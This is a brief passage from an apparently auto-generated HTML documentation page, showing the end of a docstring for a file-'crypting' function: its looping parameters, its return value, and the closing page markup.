            on the crypting (default: {False})
        iterate_count : int

            Internal variable for looping 
            on the crypting (default: {1})
        is_last : bool

            Internal variable for looping 
            on the crypting (default: {False})

    Returns
    -------
        str

            Crypted file path name / None
</code></pre>
    </div>
    <div class='code'>
      <div class="highlight"><pre></pre></div>
    </div>
  </div>
  <div class='clearall'></div>
</div>
</body>
